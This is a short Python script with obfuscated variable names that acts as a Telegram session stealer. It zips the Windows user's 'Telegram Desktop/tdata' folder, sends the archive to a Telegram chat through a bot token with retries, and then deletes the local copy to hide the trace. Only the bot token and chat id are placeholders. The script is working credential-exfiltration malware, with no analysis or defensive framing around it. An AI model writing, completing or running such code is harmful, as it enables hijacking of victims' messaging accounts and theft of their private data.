import os as a
import zipfile as b
import io as c
import asyncio as d
from datetime import datetime as e
from telegram import Bot as f

BTo = 'tg_bot_token'
CHId = 'telegram chat id'

async def g(h):
    if not a.path.exists(h):
        return None

    i = c.BytesIO()
    with b.ZipFile(i, 'w', b.ZIP_DEFLATED) as j:
        for k, _, l in a.walk(h):
            for m in l:
                n = a.path.join(k, m)
                o = a.path.relpath(n, start=a.path.dirname(h))
                try:
                    j.write(n, o)
                except PermissionError:
                    continue

    i.seek(0)
    return i

async def p(q, r):
    with open(r, 'wb') as s:
        s.write(q.getvalue())

async def t(u, v, w, x):
    y = f(token=w)
    u.seek(0)

    for z in range(3):
        try:
            await y.send_document(chat_id=x, document=u, filename=v)
            return True
        except Exception:
            await d.sleep(2)
    return False

async def A():
    B = a.getlogin()
    C = e.now().strftime("%Y%m%d_%H%M%S")
    D = a.path.join('C:\\Users', B, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
    E = f'LOG-{B}-{C}.zip'
    F = a.path.join(a.getcwd(), E)

    G = await g(D)
    if G:
        await p(G, F)
        H = await t(G, E, BTo, CHId)

        if H:
            if a.path.exists(F):
                a.remove(F)
                print(f"Deleted zip file: {F}")
    else:
        print(f"Error: Could not create zip file '{E}'.")

if __name__ == "__main__":
    d.run(A())

